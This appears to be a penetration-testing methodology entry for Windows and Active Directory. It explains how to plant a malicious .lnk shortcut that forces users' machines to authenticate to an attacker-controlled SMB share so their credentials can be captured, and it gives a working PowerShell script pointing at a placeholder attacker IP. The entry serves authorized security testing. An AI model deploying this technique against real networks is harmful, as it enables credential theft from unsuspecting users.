---
testcase: Interacting with Users - Malicious .lnk File in Modern Environments
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://attack.mitre.org/techniques/T1552/
how-to-test: |
  - Generate a malicious .lnk file using PowerShell or a tool like Lnkbomb, targeting an attacker-controlled SMB share.
  - Place the .lnk file in a location likely to be browsed by users (e.g., shared folders).
  - Monitor for authentication events and capture exposed credentials using tools such as Responder or Inveigh.
  - Example PowerShell script to create a malicious .lnk file:

    ```powershell
    $objShell = New-Object -ComObject WScript.Shell
    $lnk = $objShell.CreateShortcut("C:\legit.lnk")
    $lnk.TargetPath = "\\<attackerIP>\@pwn.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
    $lnk.HotKey = "Ctrl+Alt+O"
    $lnk.Save()
    ```
---
